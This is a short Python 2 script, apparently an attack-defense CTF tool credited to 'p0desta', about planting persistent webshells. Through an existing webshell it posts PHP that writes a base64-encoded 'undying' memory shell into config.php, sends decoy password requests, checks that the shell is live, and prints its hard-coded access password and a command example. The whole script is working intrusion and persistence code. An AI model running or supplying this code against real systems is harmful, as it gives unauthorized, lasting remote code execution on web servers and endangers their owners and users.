#coding:utf-8
# author : p0desta

import requests
import paramiko
import threading
import  time
import argparse
from command import *
def make_sudo(url,passwd,shellurl,php):#通过小马种植不死马
    php = php.encode('base64')[:-1]
    #默认使用的md5马
    #print url
    data = {passwd:"file_put_contents(\"config.php\",base64_decode(\""+php+"\"));","pass":"987aed24dbac1610cd95edb012fcdf35"}
    try:
        data2 = data.copy()
        send_fake_passwd(url,data2)
        attark = requests.post(url=url,data=data,timeout=0.2)
        send_fake_passwd(url,data2)
    except:
        return
    try:
        attack = requests.get(url=shellurl,timeout=0.1)
        if attack.status_code !=200:
            print "sorry memoryshell is not exist"
        else:
            print "please visit "+ shellurl+"   and password is :" + "pass=987aed24dbac1610cd95edb012fcdf35&cmd=phpinfo();"
    except requests.exceptions.ReadTimeout:
        IN = 1
        print url+"-----Write success"
    except:
        IN = 0
        print url+"-----Write fail"
